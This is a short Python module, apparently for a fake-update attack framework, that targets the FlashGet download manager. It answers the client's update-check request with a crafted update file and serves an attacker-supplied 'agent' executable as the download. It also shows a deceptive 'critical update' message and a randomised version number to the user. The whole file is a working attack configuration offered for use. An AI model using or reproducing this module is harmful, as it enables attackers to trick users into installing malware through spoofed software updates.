from modules import ModuleBase


class FlashGet(ModuleBase):
    name = 'Flashget'
    version = '1.0'
    appver = ''
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = ''
    vh = '(www.flashget.com)' 
    requests = [
        {   'path': '/updatecheck.php?',
            'type': 'file',
            'method': '',
            'bin': 0,
            'string': '',
            'parse': 1,
            'file': './include/flashget/flashget_fgupdate.ini',
        },

        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]
    options = {
        'description': {
            'val': 'This critical update fix internal vulnerability',
            'desc': 'Description to be displayed during the update'
        },
        'version': {
            'val': "'7.2.' + rand_num(2)",
            'hidden': 1,
            'dynamic': 1,
        }
    }
